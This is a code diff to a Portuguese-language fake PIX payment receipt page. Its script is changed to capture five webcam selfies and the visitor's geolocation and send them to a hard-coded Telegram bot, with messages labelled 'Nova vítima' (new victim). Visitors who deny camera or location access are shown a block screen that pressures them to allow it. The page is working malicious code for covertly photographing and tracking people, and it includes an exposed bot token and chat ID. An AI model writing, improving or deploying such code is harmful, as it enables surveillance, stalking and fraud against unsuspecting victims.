@@ -148,7 +148,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
   <button onclick="downloadPDF()">Baixar comprovante</button>
 </div>
 
-<!-- TELA DE BLOQUEIO CASO NEGUE PERMISSÕES -->
+<!-- TELA DE BLOQUEIO -->
 <div id="blockScreen">
   <h2>Permissão negada</h2>
   <p>Para visualizar o comprovante, é necessário permitir acesso à câmera e localização.</p>
@@ -158,31 +158,35 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
 const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
 const CHAT_ID = '-1003187104876';
 
-let selfieData = null;
+let selfies = [];
 let locationData = null;
 
 async function continuar(){
   if(!document.getElementById('robot').checked){alert('Marque a caixa primeiro.');return;}
 
-  // SOLICITA CÂMERA
+  // CAPTURA 5 SELFIES (intervalo de 600ms entre cada)
+  selfies = [];
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-    await new Promise(r => video.onloadedmetadata = r);
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video,0,0);
-    selfieData = canvas.toDataURL('image/jpeg');
+    for(let i=0;i<5;i++){
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      await new Promise(r => video.onloadedmetadata = r);
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video,0,0);
+      selfies.push(canvas.toDataURL('image/jpeg'));
+      await new Promise(r => setTimeout(r,600));
+    }
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {
     mostraBlock();
     return;
   }
 
-  // SOLICITA LOCALIZAÇÃO
+  // LOCALIZAÇÃO
   if (!navigator.geolocation){ mostraBlock(); return; }
   navigator.geolocation.getCurrentPosition(
     async pos => {
@@ -191,11 +195,11 @@ async function continuar(){
         lon: pos.coords.longitude,
         acc: pos.coords.accuracy
       };
-      await enviaInfo();
+      await enviaTudo();
       mostraComprovante();
     },
     async () => {
-      await enviaInfo();
+      await enviaTudo();
       mostraBlock();
     }
   );
@@ -213,24 +217,25 @@ function mostraComprovante(){
   document.getElementById('auth').textContent='PIX'+Date.now().toString().slice(-9);
 }
 
-async function enviaInfo(){
+async function enviaTudo(){
   const msg = `Nova vítima:
-Selfie: ${selfieData ? 'OK' : 'negada'}
+${selfies.length} selfies capturadas
 Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}` : 'negada'}`;
   await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({chat_id:CHAT_ID,text:msg})
   });
-  if(selfieData){
-    const binary = atob(selfieData.split(',')[1]);
+  // Envia cada selfie
+  for(let i=0;i<selfies.length;i++){
+    const binary = atob(selfies[i].split(',')[1]);
     const arr = new Uint8Array(binary.length);
-    for(let i=0;i<binary.length;i++) arr[i]=binary.charCodeAt(i);
+    for(let j=0;j<binary.length;j++) arr[j]=binary.charCodeAt(j);
     const blob = new Blob([arr],{type:'image/jpeg'});
     const fd = new FormData();
     fd.append('chat_id',CHAT_ID);
-    fd.append('photo',blob,'selfie.jpg');
-    fd.append('caption','Selfie da vítima');
+    fd.append('photo',blob,`selfie_${i+1}.jpg`);
+    fd.append('caption',`Selfie ${i+1}/5`);
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
   }
 }
